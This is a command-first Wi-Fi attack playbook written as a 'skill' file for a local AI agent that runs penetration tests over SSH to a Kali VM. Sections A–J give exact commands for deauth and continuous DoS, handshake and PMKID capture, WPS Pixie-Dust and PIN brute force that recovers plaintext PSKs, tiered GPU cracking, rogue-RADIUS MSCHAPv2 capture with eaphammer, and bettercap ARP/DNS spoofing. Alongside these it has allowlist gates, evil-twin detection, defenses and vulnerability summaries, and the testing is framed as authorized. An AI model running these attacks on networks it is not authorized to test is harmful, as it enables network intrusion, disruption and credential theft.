# SKILL — Wi-Fi Attacks (Operator Cheat-Brain)

> **Load this file into the local AI (qwen3-agent / Ollama) before it drives any Wi-Fi job.**
> This is an operator's cheat-brain for **authorized** Wi-Fi security testing, exams, and sanctioned
> competitions: own gear or organiser-sanctioned APs only. It is **command-first** — method, when,
> exact commands, decision order, one-line defense. Not an essay. Trust the scripts for determinism;
> the AI narrates and chooses the next play.

---

## 0. THE HARD RULES (read every run — these override everything below)

1. **ALLOWLIST GATES EVERY TRANSMIT.** No frame (scan-probe/deauth/capture/WPS/PMKID/EAP) leaves the
   radio against a BSSID that is **not** in `authorized-targets.txt`. Enforce it **twice**: at capture
   (by BSSID) and again at crack (by ESSID). No exceptions, no AI "judgment call."
2. **EVIL-TWIN / CAPTIVE-PORTAL = DETECTOR + CONCEPT ONLY.** Never build or run a fake-login page or
   portal that captures a real person's password. This is the one hard line. Capture, deauth, WPS,
   PMKID, and **lab-only EAP against a RADIUS you own** are standard authorized tools and are fine.
3. **NEVER `modprobe`/reload the driver** on the passed-through RTL8188EUS — it drops USB passthrough
   and the adapter vanishes. Soft-reset only (`fix-adapter.sh`); hard-reset is a Mac-side USB re-plug.
4. **Mac cracks, Kali radios.** Cracking runs on the Mac GPU (hashcat Metal, ~185k H/s WPA2). The VM
   never cracks. Keep every capture burst **< ~75 s** or airodump throws "Aborted" under load.
5. **Smallest blast radius that works.** Targeted single-client deauth over broadcast; PMKID (silent)
   over deauth when you can; bounded frame counts and durations always.

---

## 1. SYSTEM MAP (so commands land in the right place)

```
Mac (controller + GPU cracker + UI @ localhost:8787 + Ollama @ localhost:11434)
  │  ssh key auth → kali@192.168.64.2  (user kali, passwordless sudo)
  ▼
Kali VM (UTM) ── USB passthrough ──► TP-Link RTL8188EUS  (wlan0, 2.4 GHz ONLY, monitor via rtl8xxxu, usb 2357:010C)
```

- **Kali-side scripts** live at `/home/kali/` → run over SSH.
- **Mac-side script** `crack-mac.sh` lives in the lab dir → runs locally on the GPU.
- **Lab dir (quote the space!):** `"/Users/macbook/Ai agent /wifi-lab"`
- **Allowlist (master copy, edited in the UI):** `"/Users/macbook/Ai agent /wifi-lab/authorized-targets.txt"`
- **Pipeline rule:** capture on Kali and crack on the Mac **concurrently** — the instant a hash lands,
  `scp` it and start Tier 0–1 while Kali hunts the next target. Never serialize.

---

## 2. THE ALLOWLIST GATE (do this before ANY attack play)

The allowlist ships empty; it is populated on-site (paste organiser BSSIDs / "add from scan" /
"authorize all scanned" at a sanctioned venue). Gate logic the AI MUST run first:

```bash
LAB="/Users/macbook/Ai agent /wifi-lab"
ALLOW="$LAB/authorized-targets.txt"
B="AA:BB:CC:DD:EE:FF"   # target BSSID, resolved from the scan row
# case-insensitive, ignore '#' comment lines and labels after the BSSID:
if grep -viE '^\s*#' "$ALLOW" | grep -qiE "^\s*${B//:/\\:}\b"; then
  echo "GATE=OK  $B is authorized"
else
  echo "GATE=REFUSED  $B not on allowlist — STOP. Do not transmit."; exit 1
fi
```

**Defense-in-depth at crack time** (ESSID layer): build `authorized-essids.txt` from the authorized
rows, then filter the hash before cracking so a stray off-list capture can never be cracked:
```bash
hcxhashtool -i /tmp/hash.22000 --essid-list="$LAB/authorized-essids.txt" -o /tmp/auth.22000
```

---

## 3. THE 4-PHASE PRO WORKFLOW (the order experts move for speed)

```
PHASE 1  RECON & TARGET LOCK   → scan, record BSSID/CH/PWR/CLIENTS/ESSID + OUI; GATE the BSSID.
PHASE 2  CAPTURE               → PMKID-first (clientless, quiet) → handshake-second (needs a client).
PHASE 3  CONVERT/CLEAN/TRIAGE  → one unified -m 22000 file; hcxhashtool allowlist+dedupe; potfile --show.
PHASE 4  TIERED GPU CRACK      → strict probability-per-second order; each tier runs only if the last failed.
```

**Master decision tree (what to try first):**
- Clients associated? → **handshake** is easy (`grab.sh`). No clients? → **PMKID-first** (`hcxdumptool`).
- WPS enabled (wash)? → **Pixie-Dust FIRST** (offline, no lockout) — can skip cracking entirely.
- Deauth has zero effect / MFP present? → that's a **finding** (802.11w). Pivot to **PMKID**.
- Target invisible in scan? → almost always **5/6 GHz** → out of this 2.4-only adapter's reach. Report, don't retry.
- Password looks numeric (phone/date culture)? → jump a **numeric mask** ahead of big wordlists.

---

## 4. PLAYS — each: METHOD · WHEN · COMMANDS · ORDER · DEFENSE  (all GATED by §2)

### A. RECON / SCAN  — `wifi-scan.sh`
- **Method:** channel-locked 2.4 GHz sweep (reliable on the flaky rtl8xxxu); listen-only, attacks nothing.
- **When:** always first. Builds the picker and the OUI → vendor/ISP read (tells you the default-key mask later).
- **Commands:**
  ```bash
  ssh kali@192.168.64.2 'bash /home/kali/wifi-scan.sh'
  # → one line per AP:  BSSID|CH|PWR|CLIENTS|ESSID   (sorted: most clients, then strongest)
  ```
- **Order:** scan → record the row → **GATE the BSSID** → decide PMKID vs handshake from the CLIENTS column.
- **Defense:** you can't hide from passive recon; don't broadcast the SSID as "security," and segment guest VLANs.

### B. HANDSHAKE CAPTURE  — `grab.sh`
- **Method:** locate the AP's channel, airodump it, targeted-deauth a connected client (3 frames) to force a
  fast re-handshake, confirm "1 handshake". Crackable material is really the client's **M2**.
- **When:** a client is associated to the target (CLIENTS > 0). The #1 "no handshake" cause is **no client**.
- **Commands:**
  ```bash
  ssh kali@192.168.64.2 'bash /home/kali/grab.sh <BSSID> [channel]'   # → /tmp/cap-01.cap on Kali
  # prints RESULT=HANDSHAKE_CAPTURED file=/tmp/cap-01.cap  (or AP_NOT_FOUND / NO_HANDSHAKE clients_seen=[...])
  scp kali@192.168.64.2:/tmp/cap-01.cap /tmp/mac-cap.cap               # hand off to the Mac GPU
  ```
- **Order:** try PMKID first if the AP leaks one (quieter); else handshake. Keep the window < ~75 s; deauth
  2–3 frames at a time, never a flood; confirm "1 handshake" before moving on.
- **Defense:** long random PSK; 802.11w/MFP (blocks the deauth); WPA3-SAE (no offline-crackable handshake).

### C. PMKID / CLIENTLESS CAPTURE  — `hcxdumptool`
- **Method:** modern APs put an RSN PMKID in the first EAPOL/M1 right after association — grabbed **without
  any client and without deauthing anyone**. Crackable the instant it lands; start the GPU immediately.
- **When:** no clients on the AP; need to stay quiet; MFP/802.11w defeats deauth; drive-by/mass collection.
- **Commands (on Kali; keep burst < ~75 s):**
  ```bash
  ssh -tt kali@192.168.64.2 'sudo timeout 70 hcxdumptool -i wlan0 -w /tmp/dump.pcapng -c 1,6,11'
  # tighter, single AP:  sudo hcxdumptool -i wlan0 -o /tmp/pmkid.pcapng --filterlist_ap=<BSSID> --filtermode=2
  scp kali@192.168.64.2:/tmp/dump.pcapng /tmp/dump.pcapng
  ```
- **Order:** **PMKID before handshake** whenever clients are absent or you want silence. Fall back to handshake
  if the AP strips/zeroes the PMKID. **WPA3-SAE emits none** — don't wait on it.
- **Defense:** disable PMKID/roaming cache where unused; WPA3-SAE; long random PSK (PMKID still needs cracking).
- **Gotcha:** match `hcxdumptool` and `hcxpcapngtool` versions or conversion silently drops pairs. Don't set
  monitor via hcxdumptool's own flag on the passthrough iface — let `fix-adapter.sh` own monitor mode.

### D. WPS — PIXIE-DUST then PIN  — `wash` / `reaver` / `bully` / `pixiewps`
- **Method:** WPS PIN is 8 digits (8th = checksum) validated in two halves → 11,000 online guesses. Pixie-Dust
  recovers the PIN **offline** from one M1→M3 exchange by exploiting weak/zero-entropy nonces (E-S1/E-S2).
- **When:** `wash` shows the AP has WPS. **Always try Pixie-Dust first** — it ignores WPS lockout and finishes
  in seconds-to-minutes on weak chipsets (Ralink/MediaTek zero-nonce, many Broadcom, some Realtek; **TP-Link is
  the most-affected vendor** in current surveys — relevant to the user's own gear).
- **Commands (GATE the BSSID first):**
  ```bash
  ssh kali@192.168.64.2 'sudo wash -i wlan0'                                  # enumerate: WPS? Locked? version
  ssh -tt kali@192.168.64.2 'sudo reaver -i wlan0 -b <BSSID> -c <CH> -K 1 -vv' # Pixie-Dust (reaver-fork-t6x)
  ssh -tt kali@192.168.64.2 'sudo bully wlan0 -b <BSSID> -c <CH> -d -v 3'      # Pixie-Dust (bully)
  ssh -tt kali@192.168.64.2 'sudo reaver -i wlan0 -b <BSSID> -c <CH> -p <PIN> -vv'  # replay recovered PIN → prints plaintext PSK
  # ONLINE brute (last resort, unlocked only, lockout-aware):
  ssh -tt kali@192.168.64.2 'sudo reaver -i wlan0 -b <BSSID> -c <CH> -vv -N -d 15 -T 1 -r 3:15'
  ```
- **Order:** `wash` → **Pixie-Dust** (even if `Locked=Y` — offline is unaffected) → recovered PIN → `reaver -p`
  dumps the PSK (no hashcat needed) → only if Pixie fails *and* unlocked, online PIN brute; abandon on lockout.
- **Defense:** **disable WPS** entirely (the real fix); if forced, use PBC-only + an AP with proper nonce entropy + lockout.

### E. DEAUTH / DISCONNECT  — `aireplay-ng` / `mdk4`  (bounded, approval-gated at scale)
- **Method:** forged deauth/disassoc frames knock a client off so it re-handshakes (capture) or demonstrate a
  bounded availability/DoS case. Targeted beats broadcast.
- **When:** to force a handshake (primary), or a sanctioned DoS-resilience demo (secondary, explicit go-ahead).
- **Commands:**
  ```bash
  # TARGETED single client (quietest; this is what grab.sh already does):
  ssh kali@192.168.64.2 'sudo aireplay-ng --deauth 5 -a <BSSID> -c <CLIENT> wlan0'
  # BROADCAST all clients (higher impact — needs explicit approval):
  ssh kali@192.168.64.2 'sudo aireplay-ng --deauth 10 -a <BSSID> wlan0'
  # CONTINUOUS DoS (a sole AP you OWN only; always time-box):
  ssh kali@192.168.64.2 'sudo timeout 20 aireplay-ng --deauth 0 -a <BSSID> wlan0'
  # mdk4 targeted amok (PMF-aware alt):   sudo mdk4 wlan0 d -B <BSSID> -c <CH>
  ```
- **Order:** targeted 3–10 frames FIRST (>30/burst is just noise). If the client stays up → **MFP/802.11w** →
  stop escalating, pivot to **PMKID (C)**. Broadcast/continuous only with approval + a timeout.
  `mdk4 a` (auth flood) can wedge APs — avoid; `mdk4 b` (beacon flood) is NOT an attack here, only a signature to test your own detector.
- **Defense:** **802.11w/PMF** (cryptographically rejects classic deauth) — enable on WPA2, mandatory in WPA3.

### F. CONVERT / CLEAN / TRIAGE  (Mac, before burning GPU time)
- **Method:** everything → **one unified `-m 22000`** file (carries BOTH PMKID and EAPOL; 2500/.hccapx/16800 are
  deprecated, never use them). Filter to authorized ESSIDs, dedupe, drop junk; then free-win check the potfile.
- **When:** immediately after any capture lands, before any attack tier.
- **Commands:**
  ```bash
  hcxpcapngtool -o /tmp/hash.22000 /tmp/mac-cap.cap          # .cap/.pcapng → 22000 (PMKID+EAPOL)
  hcxhashtool -i /tmp/hash.22000 --essid-list="$LAB/authorized-essids.txt" -o /tmp/auth.22000   # §2 ESSID gate + dedupe
  hashcat -m 22000 /tmp/auth.22000 --show                   # Tier 0 free wins from the shared potfile (ms)
  ```
- **Order:** convert → **allowlist-filter** → `--show` potfile → only then Phase 4.
- **Gotcha:** empty 22000 = capture lacks usable EAPOL (no M1-PMKID, no M2/M3) **or** it's FT-PSK(802.11r)/WPA3-SAE
  (uncrackable this way). Never hand-edit a pcap; re-capture raw.

### G. TIERED GPU CRACK  — `crack-mac.sh` + the pro ladder (STRICT probability-per-second)
- **Method:** WPA2 is a deliberately slow hash (PBKDF2-SHA1 ×4096) — never brute everything. Spend the clock
  highest-yield-first; each tier runs only if the last didn't crack. One-command path:
  ```bash
  "/Users/macbook/Ai agent /wifi-lab/crack-mac.sh" /tmp/mac-cap.cap 1   # level 1 fast → 2 → 3 deeper
  ```
- **BAKE THESE FLAGS into manual runs:** `-m 22000 -O -w 3 -d 1 --status --status-timer 5
  --session=rnd1 -o cracked.txt --potfile-path "$LAB/shared.potfile"`  ( `-O` ≈ doubles WPA2 throughput on
  Metal; caps candidate len ~27, irrelevant for real keys. `--session`+`--potfile-path` = resume + reuse across rounds.)
- **The winning order:**
  - **Tier 0 — instants (s):** `--show` potfile → tiny curated lists:
    ```bash
    for L in top62 top447 top4800; do hashcat -m 22000 -O -w 3 /tmp/auth.22000 \
      "$LAB/wordlists-seclists/Passwords/WiFi-WPA/probable-v2-wpa-$L.txt"; done
    ```
  - **Tier 1 — numeric masks (best bang/buck on consumer Wi-Fi):**
    ```bash
    hashcat -m 22000 -O -w 3 -a 3 /tmp/auth.22000 '?d?d?d?d?d?d?d?d'      # 8-digit 10^8 ≈ 9 min
    hashcat -m 22000 -O -w 3 -a 3 /tmp/auth.22000 '09?d?d?d?d?d?d?d?d'    # phone, prefix PINNED → ~54 s
    hashcat -m 22000 -O -w 3 -a 3 /tmp/auth.22000 -1 '?u?d' '?1?1?1?1?1?1?1?1'  # 8-char ISP default-key mask
    ```
    (Full 10-digit = 10^10 ≈ 15 h — **always pin the known national/operator prefix**, never run it raw.)
  - **Tier 2 — rockyou straight + light rule:**
    ```bash
    hashcat -m 22000 -O -w 3 /tmp/auth.22000 "$LAB/rockyou.txt"                        # 14.3M ≈ 77 s
    R=/opt/homebrew/opt/hashcat/share/hashcat/rules
    hashcat -m 22000 -O -w 3 /tmp/auth.22000 "$LAB/rockyou.txt" -r "$R/best66.rule"     # (NOT best64 — see note)
    hashcat -m 22000 -O -w 3 /tmp/auth.22000 "$LAB/rockyou.txt" -r "$R/top10_2025.rule"
    ```
  - **Tier 3 — hybrid (word+pattern), very high real-world yield:**
    ```bash
    hashcat -m 22000 -O -w 3 -a 6 /tmp/auth.22000 "$LAB/rockyou.txt" '?d?d?d?d'   # append year → "Liverpool2024"
    hashcat -m 22000 -O -w 3 -a 7 /tmp/auth.22000 '?d?d?d?d' "$LAB/rockyou.txt"   # prepend
    ```
  - **Tier 4 — TARGETED / OSINT (where you beat everyone):** seed from the **ESSID** itself, the owner/business
    (`cewl -d 2 -m 5 https://TARGET -w /tmp/site.txt` on Kali), names/dates/phones/addresses; mutate a small rich
    base with heavy rules (small base × big rule is cheap). Vendor/default masks from the OUI. Also:
    ```bash
    hcxpsktool -i /tmp/auth.22000 ... | hashcat -m 22000 -O /tmp/auth.22000 -   # BSSID/ESSID-derived default candidates
    ```
  - **Tier 5 — bigger masks last** (9-char mixed, full vendor masks) only if time remains.
- **Order in a timed round:** potfile → curated lists → 8-digit → rockyou → rockyou×small-rule → word+year hybrid
  → ESSID/OSINT×rules → big masks. **Never start a run that can't finish in the time left.** Resume: `hashcat --session=rnd1 --restore`.
- **Defense:** 12+ char random passphrase (kills dictionaries AND feasible masks); rotate factory defaults.
- **`crack-mac.sh` upgrade notes (known gaps to patch when you touch it):** its rule step guards on
  `best64.rule`, which is **absent** in this hashcat (only `best66.rule` ships) → the rule tier currently
  **no-ops**. Add `-O` to every call (biggest free speedup), add the Tier-3 hybrid, pipe through `hcxhashtool
  --essid-list` before cracking (crack-time allowlist), and add `--session`/`--potfile-path`.
- **Gotcha (8-char floor):** mode 22000 drops any base word < 8 chars **before** rules fire, so `timmy`→`timmy666`
  won't happen — build length into the base list or use masks/hybrid. Trusted hcx captures: add
  `--nonce-error-corrections=0` to cut CPU overhead.

### H. WPA-ENTERPRISE / 802.1X / EAP  — `eaphammer` / `hostapd-wpe` / `hashcat -m 5500` / `asleap`
> **BOUNDARY — read first.** The rogue-RADIUS capture below harvests inner MSCHAPv2 credentials, so it is the
> single most sensitive play. It is permitted **ONLY** against a RADIUS **and** SSID you **own**, that is on the
> allowlist, in the lab, with **no real users able to associate**. If you can't prove you own both, this area is
> a **DETECTOR + CONCEPT + DEFENSE** panel only — do not stand up the rogue AP. Never point it at a live
> enterprise/eduroam SSID. That is mass credential phishing = out.
- **Method:** PEAP/EAP-TTLS build a TLS tunnel then run inner MSCHAPv2. Trust hinges on the **client validating
  the RADIUS server cert**. If it doesn't, a rogue AP+RADIUS with the same ESSID captures the MSCHAPv2
  challenge/response (an AD/NT credential, not the PSK).
- **When:** demonstrating PEAP-MSCHAPv2 weakness on an owned lab SSID/RADIUS; or (always safe) detecting exposure.
- **Commands (lab/owned/allowlisted SSID only):**
  ```bash
  # one-time: eaphammer --cert-wizard   ; then capture inner creds on YOUR allowlisted ESSID:
  ssh -tt kali@192.168.64.2 'sudo eaphammer -i wlan0 --essid <OWN_ALLOWLISTED_SSID> --creds'
  # hostapd-wpe alt: edit hostapd-wpe.conf → run → read username/challenge/response from hostapd-wpe.log
  # crack the captured MSCHAPv2 (NetNTLMv1-equiv) on the Mac GPU — FULL field layout, not a bare pair:
  hashcat -m 5500 hash.txt "$LAB/rockyou.txt" -r "$R/best66.rule"   # line = username::::response:challenge
  asleap -C <challenge> -R <response> -W "$LAB/rockyou.txt"          # dictionary alt
  ```
- **Order:** prefer the **detector + defense** story. Only if you own the RADIUS: cert-wizard → `--creds` capture
  → `-m 5500` crack. A GTC-downgrade (if the client allows EAP-GTC) returns the password in plaintext — note it,
  but it's still owned-lab-only.
- **Defense (strongest last):** enforce server-cert validation (pin CA + exact server name, remove click-through) →
  **migrate to EAP-TLS** (mutual certs, no password to phish/crack). MSCHAPv2 is weak *regardless of password
  strength* (NT hash reduces to DES → guaranteed recovery / pass-the-hash) — EAP-TLS is the real fix.

### I. EVIL-TWIN **DETECTION**  — airodump CSV diff / `tshark` / `kismet`  (DETECTOR + CONCEPT ONLY)
> **No portal. No harvester.** We detect and explain; we never capture a real person's password.
- **Concept (document, don't weaponize):** an evil-twin clones a legit SSID (often spoofing BSSID); KARMA/MANA
  answer every probe so devices auto-join remembered nets; classic kill-chain = deauth victim off real AP →
  victim joins twin → captive portal harvests creds. **We stop before the portal.**
- **When:** blue-team/defensive demo; baseline a venue; prove a lookalike SSID is present.
- **Detection method + commands:**
  ```bash
  # passive sweep to CSV, then diff ESSID/BSSID pairs vs the allowlist (allowlist = per-SSID BSSID whitelist):
  ssh kali@192.168.64.2 'sudo timeout 60 airodump-ng --band bg -w /tmp/recon --output-format csv wlan0'
  # count deauth(12)/disassoc(10) frames → flood signal (>~20 broadcast/60s = alert, baseline-tuned):
  ssh -tt kali@192.168.64.2 'sudo tshark -i wlan0 -I -Y "wlan.fc.type_subtype==12 || wlan.fc.type_subtype==10" -T fields -e wlan.sa -e wlan.da -e wlan.bssid'
  ssh -tt kali@192.168.64.2 'sudo kismet -c wlan0'   # ready WIDS: BSSIDSPOOFED/APSPOOF/DEAUTHFLOOD/PROBENOJOIN
  ```
- **Flag:** same ESSID + different BSSID (MITRE **DET0379**); one BSSID on many channels; one BSSID many ESSIDs
  (KARMA/MANA); encryption/cipher mismatch for one SSID; an anomalously strong twin on an adjacent channel; a
  deauth flood co-occurring with a duplicate-SSID event = high confidence. Always label **"possible," never "confirmed."**
- **Defense:** 802.11w/PMF; WPA3-SAE (can't clone a tunnel it can't auth); client "connect to this network only"
  profiles + server-cert pinning for enterprise; monitor with the above.

### J. MITM / DNS on OWN DEVICES  — `bettercap`  (lab subnet ONLY, mandatory rollback)
- **Method:** recon the lab subnet, ARP-spoof **your own** test client to observe traffic, optionally DNS-spoof a
  **lab-only** domain to show redirection, then fully roll back. "See what MITM looks like on my own network."
- **When:** demonstrating MITM/DNS risk on **192.168.64.x** (your lab) against a device you control. Never third parties.
- **Commands:**
  ```bash
  ssh -tt kali@192.168.64.2 'sudo bettercap -iface wlan0'
  #   net.probe on ; net.show ; wifi.recon on ; wifi.show
  #   net.probe off                                   # turn OFF before arp.spoof (they conflict)
  #   set arp.spoof.targets 192.168.64.50 ; set arp.spoof.fullduplex true ; arp.spoof on ; net.sniff on
  #   set dns.spoof.domains lab.test ; set dns.spoof.address 192.168.64.2 ; dns.spoof on
  #   ROLLBACK (mandatory): arp.spoof off ; dns.spoof off   → verify gateway MAC + client DNS restored, save pcap
  ```
- **Order:** recon → spoof **one** owned client → observe → roll back → verify restoration. Everything bettercap
  does is loudly IDS-detectable — that's fine on your own lab, never anywhere else.
- **Defense:** dynamic ARP inspection / static ARP on critical hosts; DNSSEC + DoH/DoT; HTTPS-everywhere + HSTS.

---

## 5. SELF-HEAL / DOCTOR — decision order (bake into auto-recovery)

| Symptom | Fix (in order) |
|---|---|
| 0 APs / adapter hung | `ssh kali@192.168.64.2 'sudo bash /home/kali/fix-adapter.sh'` (soft: down→monitor→up) |
| `wlan0` gone / wedged | Mac-side: `utmctl usb disconnect 2357:010C; sleep 3; utmctl usb connect Kali 2357:010C` |
| VM down / no SSH | `utmctl stop Kali; sleep 3; utmctl start Kali` → poll SSH ~15–30 s |
| airodump "Aborted" under load | keep every capture window **< ~75 s**; chunk long jobs |
| No handshake | a client MUST be connected → targeted deauth to force reassoc, or pivot to **PMKID** |
| Target invisible | almost certainly **5/6 GHz** → out of this 2.4-only adapter's range; report, don't retry |
| **GOLDEN RULE** | **NEVER `modprobe`/reload the driver** on the passthrough adapter — it drops the device |

---

## 6. TROUBLESHOOTING CATALOG (signature → cause → fix)

**Adapter / rtl8xxxu**
- `fixed channel wlan0: -1` → never truly in monitor / NM retuning → `fix-adapter.sh`; `sudo airmon-ng check kill`; lock `-c <ch>`.
- Scan 0 APs though APs nearby → adapter hung / channel unlocked → `fix-adapter.sh`, then USB re-plug.
- `wlan0` absent from `iw dev` → USB passthrough dropped → Mac-side `utmctl usb disconnect/connect 2357:010C`.
- `Operation not supported` on set-monitor → wrong/stock driver or NM fighting → prefer in-kernel `rtl8xxxu`, `airmon-ng check kill`; **don't** rebuild/modprobe.

**UTM / SSH**
- `ssh ... No route to host` → VM down → `utmctl stop/start Kali`, poll 15–30 s.
- `Connection refused` → sshd not up yet → keep polling; `utmctl status Kali` should say "started".
- `Host key verification failed` (VM rebuilt) → `ssh-keygen -R 192.168.64.2` then reconnect (lab host only).
- `Pseudo-terminal will not be allocated` / curses tool misbehaves → add `ssh -tt` (airodump UI, reaver, bettercap).
- `Write failed: Broken pipe` mid-capture → run long jobs detached (`nohup`/`tmux`) and poll output files.

**Capture / aircrack / hcx**
- airodump "Aborted" → instability under load → windows < ~75 s (`grab.sh` is tuned for this).
- "No valid WPA handshakes found" → partial EAPOL → recapture with an active client; verify M1..M4 / PMKID.
- hcxpcapngtool empty .22000 → no usable EAPOL **or** FT-PSK(802.11r)/WPA3-SAE (uncrackable this way).
- `failed to read packet` → pcap edited/truncated → never clean a dump; feed raw.
- hcxdumptool captures nothing on RTL8188EUS → `airmon-ng check kill`; some versions are picky → fall back to airodump + hcxpcapngtool.

**hashcat (Mac Metal)**
- "No hashes loaded" → wrong `-m`/malformed line → WPA=`-m 22000`; MSCHAPv2=`-m 5500` full `username::::response:challenge`.
- `-m 5500` rejects data → you gave a bare `challenge:response` → rebuild the full field layout.
- "Not enough allocatable device memory" (Metal OOM) → lower `-w` to 1–2, fewer rules, split the wordlist.
- "Token length exception" / "Separator unmatched" → stray CRLF/whitespace/field count → one clean hash per line.
- Slow vs ~185k H/s → thermal throttle, `-w` too low, or running **inside the VM** → crack on the **Mac**, raise `-w`, let it cool.
- Status "Exhausted", no crack → not in that keyspace → escalate tiers (`crack-mac.sh <cap> $((LEVEL+1))`).

**Shell / Python glue**
- `syntax error near unexpected token 'fi'/'done'` → missing `then`/`do` → `bash -n script.sh`.
- `command not found` / `No such file` on a spaced path → the `"/Users/macbook/Ai agent /wifi-lab"` path was unquoted → always quote; `mkdir -p` before writing.
- `bad interpreter: /bin/bash^M` → CRLF → `sed -i '' 's/\r$//' file` (macOS) / `dos2unix`.
- Py `IndentationError`/`invalid syntax` → mixed tabs/spaces or old interpreter → 4 spaces, `python3`, `python3 -I` for untrusted data.
- `Address already in use` on :8787 → stale server → `lsof -i :8787` then kill; bind `127.0.0.1` only.
- UI no live data from model → `curl http://localhost:11434/v1/models`; ensure Ollama up + qwen3-agent pulled; call the `/v1` endpoint.
- Model tool output won't parse → it wrapped JSON in prose/```fences → strip fences, extract first `{...}`, validate — **never run a gated action on unparsed output**.

---

## 7. THREAT ENCYCLOPEDIA — passive detector cards (no attack capability; safe anywhere)

- **KRACK (2017, CVE-2017-13077…88):** block 4-way msg4 → force msg3 retransmits → key reinstall resets the
  nonce → keystream reuse (decrypt/replay; forge on TKIP/GCMP). FT variant **CVE-2017-13082** hits the AP
  directly, **no MitM**. *Signature:* duplicated EAPOL msg3, repeated nonces/IVs. *Defense:* patch **both** ends
  independently (refuse reinstalling an installed key); 802.11w does NOT fix it. Does not recover the PSK.
- **Dragonblood (2019, WPA3-SAE):** hunting-and-pecking PWE derivation leaks timing/cache → password-partitioning
  dictionary attack; **transition-mode downgrade** to WPA2; SAE-commit DoS. *Signature:* SAE commit floods across
  many MACs, a WPA2 assoc on a WPA3-capable SSID. *Defense:* **SAE Hash-to-Element (H2E)** (constant-time — the
  real fix, mandatory in WPA3-R3); WPA3-only over transition; anti-clogging tokens.
- **Kr00k (2020, CVE-2019-15126):** Broadcom/Cypress flush the TX buffer under an **all-zero key** after
  disassociation → spoof disassoc → decrypt a few KB. *Signature:* frames post-disassoc that decrypt with a zero
  key; disassoc storms. *Defense:* firmware patch; 802.11w/PMF; end-to-end TLS. Not PSK recovery (scale was the story: ~1B+ devices; APs affected too).
- **FragAttacks (2021):** A-MSDU flag unauthenticated (CVE-2020-24588 → injection/NAT hole-punch), mixed-key &
  fragment-cache reassembly (24587/24586), plus easy **implementation** bugs (accept plaintext frames in a
  protected net, forward EAPOL from unassociated senders). Hits WPA2 **and** WPA3 (design/impl, not crypto).
  *Signature:* forged A-MSDU, EAPOL from unassociated stations, malformed fragments. *Defense:* patch; **HTTPS
  everywhere** mitigates most even unpatched; disable fragmentation where possible.

**One-liners:** KRACK = reinstall key → reset nonce → reuse keystream. Dragonblood = SAE PWE leaks timing/cache →
dictionary WPA3; fix = H2E. Kr00k = buffered frames flushed under a zero key after disassoc. FragAttacks =
aggregation/fragmentation bits unauthenticated → inject + reassemble across keys.

---

## 8. THROUGHPUT MATH (M3 Pro Metal ≈ 185k H/s WPA2, `-O` pushes higher)

| Attack | Keyspace | ETA | Verdict in a timed round |
|---|---|---|---|
| potfile `--show` | — | ms | always first, free |
| probable-v2 lists (62/447/4800) | tiny | ~instant | always |
| 8-digit mask | 10^8 | ~9 min | yes |
| phone w/ pinned prefix | ~10^7 | ~54 s | yes |
| rockyou straight | 14.3M | ~77 s | yes |
| rockyou × best66 (~66 r) | ~1B | ~85 min | usually skip; prefer small-base × big-rule |
| 9-digit numeric | 10^9 | ~1.5 h | only if time |
| 10-digit numeric raw | 10^10 | ~15 h | **never raw — pin the prefix** |

Fits comfortably in a round: Tier0 + 8-digit + rockyou + rockyou×small-rule + word+year hybrid. Skip full
10-digit and full rockyou×big-rule.

---

## 9. COMPETITION / TIMED-ROUND EDGE

- **Pre-stage before the clock:** small lists, regional phone/date masks, rules, and a **fat shared potfile** from
  prior rounds (reused passwords are instant free wins — this alone wins rounds).
- **Strict probability-per-second order** (§3/§4G). Never start a run that can't finish in the time left.
- **Know your region's phone/date masks cold** and **pin known prefixes** (10^10 → 10^7).
- **The decider on hard nets is the TARGETED list** (Tier 4): ESSID + owner + `cewl` of their site, small base ×
  heavy rules — that's where you crack the ones nobody else gets.
- **Keep the GPU hot:** chain attacks back-to-back; crack on the Mac while Kali keeps capturing; never idle.

---

## 10. WPA3 — set expectations honestly

- **No offline crack of clean WPA3-SAE.** Don't promise one; mode 22000 does nothing on a WPA3-only net.
- **Your win condition on WPA3 = transition mode** (grab the WPA2 handshake/PMKID that still exists) or a
  WPA2-only rogue-AP downgrade. Per 2025 census only **~0.84%** of APs are WPA3 at all, mostly transition mode.
- **Evil-twin/downgrade stays DETECTOR + CONCEPT** (§4I). Defenses to surface: WPA3-only, Wi-Fi Alliance
  "Transition Disable", and 802.11w/MFP (which also kills your deauth capture).

---

_Every play above is allowlist-gated (§2). Capture / deauth / WPS / PMKID / owned-lab EAP = standard authorized
tooling. A working fake-login/captive-portal that harvests real people's passwords is the one hard line — never cross it._
